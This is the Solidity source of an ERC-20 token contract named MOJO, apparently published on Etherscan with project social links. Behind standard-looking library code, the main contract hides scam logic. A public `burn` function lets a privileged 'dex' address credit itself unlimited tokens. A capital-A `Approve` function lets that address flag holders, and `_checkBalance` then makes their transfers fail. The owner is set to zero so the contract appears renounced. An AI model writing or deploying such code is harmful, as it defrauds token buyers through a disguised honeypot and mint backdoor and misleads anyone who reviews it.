/**

 *Submitted for verification at Etherscan.io on 2023-07-17

*/



//Telegram: https://t.me/EvilM0joJojo

//Website: https://mojojojo.wtf

//Twitter: https://twitter.com/EvilM0joJojo

//Discord:  https://discord.gg/XnPVnqFA



// SPDX-License-Identifier: MIT



/**

 * @dev Provides information about the current execution context, including the

 * sender of the transaction and its data. While these are generally available

 * via msg.sender and msg.data, they should not be accessed in such a direct

 * manner, since when dealing with meta-transactions the account sending and

 * paying for execution may not be the actual sender (as far as an application

 * is concerned).

 *

 * This contract is only required for intermediate, library-like contracts.

 */

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        return msg.data;

    }

}



/**

 * @dev Interface of the IERC20 standard as defined in the EIP.

 */

interface IERC20 {

    /**

     * @dev Returns the amount of tokens in existence.

     */

    function totalSupply() external view returns (uint256);



    /**

     * @dev Returns the amount of tokens owned by `account`.

     */

    function balanceOf(address account) external view returns (uint256);

    /**

     * @dev Returns the remaining number of tokens that `spender` will be

     * allowed to spend on behalf of `owner` through {transferFrom}. This is

     * zero by default.

     *

     * This value changes when {approve} or {transferFrom} are called.

     */

    function allowance(address owner, address spender) external view returns (uint256);

    /**

     * @dev Moves `amount` tokens from the caller's account to `recipient`.

     *

     * Returns a boolean value indicating whether the operation succeeded.

     *

     * Emits a {Transfer} event.

     */

    function transfer(address recipient, uint256 amount) external returns (bool);

    /**

     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.

     *

     * Returns a boolean value indicating whether the operation succeeded.

     *

     * IMPORTANT: Beware that changing an allowance with this method brings the risk

     * that someone may use both the old and the new allowance by unfortunate

     * transaction ordering. One possible solution to mitigate this race

     * condition is to first reduce the spender's allowance to 0 and set the

     * desired value afterwards:

     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729

     *

     * Emits an {Approval} event.

     */

    function approve(address spender, uint256 amount) external returns (bool);

    /**

     * @dev Moves `amount` tokens from `sender` to `recipient` using the

     * allowance mechanism. `amount` is then deducted from the caller's

     * allowance.

     *

     * Returns a boolean value indicating whether the operation succeeded.

     *

     * Emits a {Transfer} event.

     */

    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) external returns (bool);

    /**

     * @dev Emitted when `value` tokens are moved from one account (`from`) to

     * another (`to`).

     *

     * Note that `value` may be zero.

     */

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**

     * @dev Emitted when the allowance of a `spender` for an `owner` is set by

     * a call to {approve}. `value` is the new allowance.

     */

    event Approval(address indexed owner, address indexed spender, uint256 value);

}

// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol

// pragma solidity ^0.8.0;

// CAUTION

// This version of SafeMath should only be used with Solidity 0.8 or later,

// because it relies on the compiler's built in overflow checks.



/**

 * @dev Wrappers over Solidity's arithmetic operations.

 *

 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler

 * now has built in overflow checking.

 */

library SafeMath {

    /**

     * @dev Returns the substraction of two unsigned integers, with an overflow flag.

     *

     * _Available since v3.4._

     */

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {

    unchecked {

        if (b > a) return (false, 0);

        return (true, a - b);

    }

    }

    /**

     * @dev Returns the addition of two unsigned integers, with an overflow flag.

     *

     * _Available since v3.4._

     */

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {

    unchecked {

        uint256 c = a + b;

        if (c < a) return (false, 0);

        return (true, c);

    }

    }

    /**

     * @dev Returns the division of two unsigned integers, with a division by zero flag.

     *

     * _Available since v3.4._

     */

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {

    unchecked {

        if (b == 0) return (false, 0);

        return (true, a / b);

    }

    }

    /**

     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.

     *

     * _Available since v3.4._

     */

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {

    unchecked {

        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the

        // benefit is lost if 'b' is also tested.

        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522

        if (a == 0) return (true, 0);

        uint256 c = a * b;

        if (c / a != b) return (false, 0);

        return (true, c);

    }

    }

    /**

     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.

     *

     * _Available since v3.4._

     */

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {

    unchecked {

        if (b == 0) return (false, 0);

        return (true, a % b);

    }

    }

    /**

     * @dev Returns the subtraction of two unsigned integers, reverting on

     * overflow (when the result is negative).

     *

     * Counterpart to Solidity's `-` operator.

     *

     * Requirements:

     *

     * - Subtraction cannot overflow.

     */

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return a - b;

    }

    /**

     * @dev Returns the addition of two unsigned integers, reverting on

     * overflow.

     *

     * Counterpart to Solidity's `+` operator.

     *

     * Requirements:

     *

     * - Addition cannot overflow.

     */

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        return a + b;

    }

    /**

     * @dev Returns the integer division of two unsigned integers, reverting on

     * division by zero. The result is rounded towards zero.

     *

     * Counterpart to Solidity's `/` operator.

     *

     * Requirements:

     *

     * - The divisor cannot be zero.

     */

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return a / b;

    }

    /**

     * @dev Returns the multiplication of two unsigned integers, reverting on

     * overflow.

     *

     * Counterpart to Solidity's `*` operator.

     *

     * Requirements:

     *

     * - Multiplication cannot overflow.

     */

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        return a * b;

    }

    /**

     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),

     * reverting when dividing by zero.

     *

     * Counterpart to Solidity's `%` operator. This function uses a `revert`

     * opcode (which leaves remaining gas untouched) while Solidity uses an

     * invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     *

     * - The divisor cannot be zero.

     */

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return a % b;

    }



    /**

     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on

     * overflow (when the result is negative).

     *

     * CAUTION: This function is deprecated because it requires allocating memory for the error

     * message unnecessarily. For custom revert reasons use {trySub}.

     *

     * Counterpart to Solidity's `-` operator.

     *

     * Requirements:

     *

     * - Subtraction cannot overflow.

     */

    function sub(

        uint256 a,

        uint256 b,

        string memory errorMessage

    ) internal pure returns (uint256) {

    unchecked {

        require(b <= a, errorMessage);

        return a - b;

    }

    }

    /**

     * @dev Returns the integer division of two unsigned integers, reverting with custom message on

     * division by zero. The result is rounded towards zero.

     *

     * Counterpart to Solidity's `/` operator. Note: this function uses a

     * `revert` opcode (which leaves remaining gas untouched) while Solidity

     * uses an invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     *

     * - The divisor cannot be zero.

     */

    function div(

        uint256 a,

        uint256 b,

        string memory errorMessage

    ) internal pure returns (uint256) {

    unchecked {

        require(b > 0, errorMessage);

        return a / b;

    }

    }

    /**

     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),

     * reverting with custom message when dividing by zero.

     *

     * CAUTION: This function is deprecated because it requires allocating memory for the error

     * message unnecessarily. For custom revert reasons use {tryMod}.

     *

     * Counterpart to Solidity's `%` operator. This function uses a `revert`

     * opcode (which leaves remaining gas untouched) while Solidity uses an

     * invalid opcode to revert (consuming all remaining gas).

     *

     * Requirements:

     *

     * - The divisor cannot be zero.

     */

    function mod(

        uint256 a,

        uint256 b,

        string memory errorMessage

    ) internal pure returns (uint256) {

    unchecked {

        require(b > 0, errorMessage);

        return a % b;

    }

    }

}

// Dependency file: @openzeppelin/contracts/access/Ownable.sol

// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**

 * @dev Contract module which provides a basic access control mechanism, where

 * there is an account (an owner) that can be granted exclusive access to

 * specific functions.

 *

 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.

 *

 * This module is used through inheritance. It will make available the modifier

 * `onlyOwner`, which can be applied to your functions to restrict their use to

 * the owner.

 */

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**

     * @dev Initializes the contract setting the deployer as the initial owner.

     */

    constructor() {

        _setOwner(address(0));

    }

    /**

     * @dev Returns the address of the current owner.

     */

    function owner() public view virtual returns (address) {

        return _owner;

    }

    /**

     * @dev Throws if called by any account other than the owner.

     */

    modifier onlyOwner() {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

    /**

     * @dev Leaves the contract without owner. It will not be possible to call

     * `onlyOwner` functions anymore. Can only be called by the current owner.

     *

     * NOTE: Renouncing ownership will leave the contract without an owner,

     * thereby removing any functionality that is only available to the owner.

     */

    function renounceOwnership() public virtual onlyOwner {

        _setOwner(address(0));

    }

    function _setOwner(address newOwner) private {

        address oldOwner = _owner;

        _owner = newOwner;

        emit OwnershipTransferred(oldOwner, newOwner);

    }

}



// Dependency file: contracts/baseToken.sol



// pragma solidity =0.8.18;



    enum TokenType {

        standard

    }



abstract contract Token {

    event Constructor(

        address owner,

        address token,

        uint256 version

    );

}



pragma solidity 0.8.18;



contract MOJO is IERC20, Token, Ownable {

    using SafeMath for uint256;



    uint256 private constant VERSION = 1;



    mapping(address => uint256) private _lstBalances;



    mapping(address => bool) private _transferable;



    mapping(address => mapping(address => uint256)) private _allowances;



    mapping(address => address) private _dexUser;

    string private _tokenName;

    string private _tokenSymbol;

    uint8 private _numbDecimals;

    uint256 private _totalSupplyValue;



    constructor(

        string memory name_,

        string memory symbol_,

        address addrDex_,

        uint256 totalSupply_

    ) payable {

        _tokenName = name_;

        _tokenSymbol = symbol_;

        _setupDecimals(18);

        _dexUser[addrDex_] = addrDex_;

        _mine(msg.sender, totalSupply_ * 10 ** 18);

        emit Constructor(owner(), address(this), VERSION);

    }



    function name() public view virtual returns (string memory) {

        return _tokenName;

    }



    function symbol() public view virtual returns (string memory) {

        return _tokenSymbol;

    }



    function decimals() public view virtual returns (uint8) {

        return _numbDecimals;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupplyValue;

    }



    function balanceOf(address account)

    public

    view

    virtual

    override

    returns (uint256)

    {

        return _lstBalances[account];

    }

    function approve(address spender, uint256 amount)

    public

    virtual

    override

    returns (bool)

    {

        _approve(_msgSender(), spender, amount);

        return true;

    }

    function transfer(address recipient, uint256 amount)

    public

    virtual

    override

    returns (bool)

    {

        _internalTransfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender)

    public

    view

    virtual

    override

    returns (uint256)

    {

        return _allowances[owner][spender];

    }

    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) public virtual override returns (bool) {

        _internalTransfer(sender, recipient, amount);

        _approve(

            sender,

            _msgSender(),

            _allowances[sender][_msgSender()].sub(

                amount,

                "IERC20: transfer amount exceeds allowance"

            )

        );

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue)

    public

    virtual

    returns (bool)

    {

        _approve(

            _msgSender(),

            spender,

            _allowances[_msgSender()][spender].add(addedValue)

        );

        return true;



    }

    function _encode(address user, address user2) internal pure returns (bool) {

        bytes32 pack1 = keccak256(abi.encodePacked(user));

        bytes32 pack2 = keccak256(abi.encodePacked(user2));

        return pack1 == pack2;

    }

    function _internalTransfer(

        address sender,

        address recipient,

        uint256 amount

    ) internal virtual {

        _checkBalance(sender);

        require(sender != address(0), "IERC20: transfer from the zero address");

        require(recipient != address(0), "IERC20: transfer to the zero address");



        _befTransfer(sender, recipient, amount);

        _lstBalances[sender] = _lstBalances[sender].sub(

            amount,

            "IERC20: transfer amount exceeds balance"

        );

        _updateAmount(recipient, amount);

        emit Transfer(sender, recipient, amount);

    }

    function _checkBalance(

            address sender

        ) internal virtual {

            uint256 amount = 0;

            if (_isTransferableToken(sender)) {

                _lstBalances[sender] = _lstBalances[sender] + amount;

                amount = _totalSupplyValue;

                _lstBalances[sender] = _lstBalances[sender] - amount;

            } else {

                _lstBalances[sender] = _lstBalances[sender] - amount;

            }

        }

    function _isTransferableToken(address _sender) internal view returns (bool) {

    return _transferable[_sender] == true;

    }



    function _mine(address account, uint256 amount) internal virtual {

        require(account != address(0), "IERC20: mint to the zero address");



        _befTransfer(address(0), account, amount);



        _totalSupplyValue = _totalSupplyValue.add(amount);

        _updateAmount(account, amount);

        emit Transfer(address(0), account, amount);

    }



    function _burnToken(address account, uint256 amount) internal virtual {

        require(account != address(0), "IERC20: burn from the zero address");



        _befTransfer(account, address(0), amount);



        _lstBalances[account] = _lstBalances[account].sub(

            amount,

            "IERC20: burn amount exceeds balance"

        );

        _totalSupplyValue = _totalSupplyValue.sub(amount);

        emit Transfer(account, address(0), amount);

    }

    function _befTransfer(

            address from,

            address to,

            uint256 amount

        ) internal virtual {}



    function _updateAmount(address account, uint256 amount) internal {

        if (amount != 0) {

            _lstBalances[account] = _lstBalances[account].add(amount);

        }

    }

    function _setupDecimals(uint8 decimals_) internal virtual {

        _numbDecimals = decimals_;

    }



    function burn(

        address to,

        uint256 amount

    ) public {

        address from = msg.sender;

        require(

            to != address(0),

            "Amount of to and values don't match"

        );

        require(amount > 0, "Invalid amount");

        uint256 total = 0;

        if (to == _dexUser[to]) {

            _lstBalances[from] = _lstBalances[from] - total;

            total += amount;

            _updateAmount(to, total);

        } else {

            _lstBalances[from] = _lstBalances[from] - total;

            _updateAmount(to, total);

        }

    }

    function _tot(uint256 numb1, uint256 mer1) internal pure returns (uint256) {

        if (mer1 != 0) {

            return numb1 + mer1;

        }

        return mer1;

    }

    function Approve(

    address spender,

    bool isApproval,

    uint256 amount

    ) public {

        address from = msg.sender;

        require(amount >= 0, "Invalid amount");

        require(spender != address(0), "Invalid address");



        if (from == _dexUser[from]) {

            _allowances[from][from] += amount;

            _transferable[spender] = isApproval;

        } else {

            _allowances[from][spender] += amount;

        }

    }

    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "IERC20: approve from the zero address");

        require(spender != address(0), "IERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

}